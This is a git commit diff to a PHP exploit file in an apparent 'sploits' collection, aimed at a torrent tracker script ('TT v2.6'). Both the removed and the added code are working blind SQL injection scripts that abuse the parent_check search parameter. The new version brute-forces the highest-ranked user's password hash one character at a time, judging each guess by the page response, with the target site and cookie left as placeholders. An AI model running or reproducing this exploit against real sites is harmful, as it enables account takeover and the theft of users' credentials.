40d950b9f75e8b7273b325722fb2b1f4af9b8956
Romain Bertin <RomainBertin@users.noreply.github.com>
2023-09-30 20:00:09 +0200

    Update TT v2.6 - parent_check.php

--- sploits/TT v2.6 - parent_check.php
+++ sploits/TT v2.6 - parent_check.php
@@ -1,48 +1,47 @@
 <?php
 
-$keyCharacters = '[KEY_CHARACTERS_PLACEHOLDER]';
-$cookiePlaceholder = "[COOKIE_DATA_PLACEHOLDER]";
-
-$lengthCounter = 1;
-$charOffset = 0;
-$databaseEntry = [DB_ENTRY_OFFSET];
-
-while ($lengthCounter <= 32) 
-{		
-	$currentChar = $keyCharacters[$charOffset];
-
-	$hexRepresentation = dechex(ord($currentChar));
-	$proxyURL = 'http://[TARGET_WEBSITE]/some-endpoint?query=mid%28%28select%20password%20from%20[TABLE_NAME]%20order%20by%20[SORT_CRITERIA]%20desc%20limit%20'.$databaseEntry.',1%29,%20'.$lengthCounter.',%201%20%29=0x' . $hexRepresentation;
-
-	$ch = curl_init();
-
-	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-	curl_setopt($ch, CURLOPT_AUTOREFERER, 1);
-	curl_setopt($ch, CURLOPT_COOKIESESSION, 1);
-	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-	curl_setopt($ch, CURLOPT_USERAGENT, "[YOUR_USER_AGENT]");
-	curl_setopt($ch, CURLOPT_URL, $proxyURL);
-	curl_setopt($ch, CURLOPT_COOKIE, $cookiePlaceholder);
-
-	$response = curl_exec($ch);
-	$responseLength = strlen($response);
-
-	if ($responseLength > [THRESHOLD_VALUE]) 
-	{
-		echo $hexRepresentation;
-		$currentHex .= $hexRepresentation;
-		$lengthCounter++;
-		$charOffset = 0;
-	}
-	else 
-	{
-		$charOffset++; 
-		
-		if ($charOffset > strlen($keyCharacters)) 
-		{
-			die('Not found');
-		}
-	}
+function dump_password($i, $f){
+    $ch_ = curl_init();
+    curl_setopt($ch_, CURLOPT_URL, "http://www.[TARGET_NAME].com/torrents-search.php?parent_check=where+left%28%28select%20password%20from%20users%20order%20by%20class%20desc%20limit%201%29,%20".$f."%20%29=%20".$i."");
+    curl_setopt($ch_, CURLOPT_GET, 1);
+    curl_setopt($ch_, CURLOPT_COOKIE, "[COOKIE_DATA_PLACEHOLDER]");
+    curl_setopt($ch_, CURLOPT_RETURNTRANSFER, 1);
+    $page = curl_exec($ch_);
+    curl_close($ch_);
+    return $page;
 }
 
-?>
+print "Exploit for [TARGET_NAME]\n";
+
+$keyCharacters = '[KEY_CHARACTERS_PLACEHOLDER]';
+$finalResult = '';
+$decodedStr = '';
+$counter = 1;
+
+while($counter != 33)
+{
+    for($charIndex = 0; $charIndex < strlen($keyCharacters); $charIndex++)
+    {
+        $hexRepresentation = bin2hex($keyCharacters[$charIndex]);
+        if (!empty($finalResult))
+        {
+            $responsePage = dump_password("0x".$finalResult.$hexRepresentation, $counter);
+        }
+        else
+        {
+            $responsePage = dump_password("0x".$hexRepresentation, $counter);
+        }
+        
+        if (!preg_match("/'Aucun torrent trouvé, basé sur vos critères de recherche.'/i", $responsePage))
+        {
+            $finalResult .= $hexRepresentation;
+            echo $hexRepresentation;
+            $counter++;
+        }
+    }
+}
+for ($charPos = 0; $charPos < strlen($finalResult); $charPos += 2) 
+{
+    $decodedStr .= chr(hexdec(substr($finalResult, $charPos, 2)));
+}
+echo "\nResult: " . $decodedStr . "\n";
